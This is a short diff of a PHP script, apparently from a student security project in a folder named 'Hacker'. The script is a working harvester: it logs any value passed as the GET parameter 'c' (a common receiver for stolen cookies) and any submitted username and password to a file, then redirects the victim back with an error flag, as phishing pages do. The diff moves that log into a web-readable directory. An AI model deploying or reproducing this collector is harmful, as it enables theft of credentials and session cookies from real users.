@@ -1,11 +1,11 @@
 <?php
 if (isset($_GET['c'])) {
-  file_put_contents('/var/log/apache2/log.txt', $_GET['c'] . "\n", FILE_APPEND);
+  file_put_contents('/var/www/html/PBL4/Hacker/log.txt', $_GET['c'] . "\n", FILE_APPEND);
 }
 
 if (isset($_POST['username'], $_POST['password'])) {
   $log = 'Username: ' . $_POST['username'] . ' - Password: ' . $_POST['password'];
-  file_put_contents('/var/log/apache2/log.txt', $log . "\n", FILE_APPEND);
+  file_put_contents('/var/www/html/PBL4/Hacker/log.txt', $log . "\n", FILE_APPEND);
   header('Location: ' . $_SERVER['HTTP_REFERER'] . '?error=1', TRUE, 302);
   exit;
 }
